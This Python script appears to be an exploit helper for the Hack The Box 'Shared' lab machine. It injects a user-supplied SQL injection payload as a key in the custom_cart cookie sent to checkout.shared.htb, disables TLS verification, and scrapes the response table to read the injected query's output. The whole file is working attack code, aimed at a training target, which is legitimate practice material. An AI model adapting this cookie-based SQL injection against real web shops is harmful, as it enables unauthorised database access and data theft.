import requests
import urllib3
import urllib
from bs4 import BeautifulSoup
import argparse
import json


urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def parse_arguments()->argparse.Namespace:
    # Create an ArgumentParser object
    parser = argparse.ArgumentParser(description="HTB Shared SQLi script.")
    # Add arguments with flags
    parser.add_argument("cookie", type=str, help="Cookie to inject in 'custom_cart' cookie")
    # Parse the arguments
    args = parser.parse_args()
    # Return the parsed arguments
    return args


def make_request(args: argparse.Namespace) -> None:
    url = "https://checkout.shared.htb/"
    
    # Step 1: Decode original cookie
    original_custom_cart_cookie = "%7B%22CRAAFTKP%22%3A%221%22%2C%2253GG2EF8%22%3A%221%22%2C%227DA8SKYP%22%3A%221%22%7D"
    decoded = urllib.parse.unquote(original_custom_cart_cookie)

    # Step 2: Load JSON
    cart = json.loads(decoded)

    # Step 3: Replace key (safe way)
    value = cart.pop("7DA8SKYP")  # get existing value
    cart[args.cookie] = value     # inject as new key

    # Step 4: Re-encode
    custom_cart_modified = urllib.parse.quote(json.dumps(cart, ensure_ascii=False))

    # Set cookies
    cookies = {
        "PrestaShop-5f7b4f27831ed69a86c734aa3c67dd4c": "your_real_value_here",
        "custom_cart": custom_cart_modified
    }

    # Step 5: Send request
    r = requests.get(url, cookies=cookies, verify=False)

    # Parse with BeautifulSoup
    soup = BeautifulSoup(r.text, 'html.parser')
    rows = soup.select('table.table tbody tr')

    # Print third item
    for index, row in enumerate(rows):
        cols = [col.get_text(strip=True) for col in row.find_all(['th', 'td'])]
        if index == 2:
            print(cols)


def main()->None:
    # Get arguments from user
    args = parse_arguments()
    # Send web request
    make_request(args)


if __name__ == "__main__":
    main()
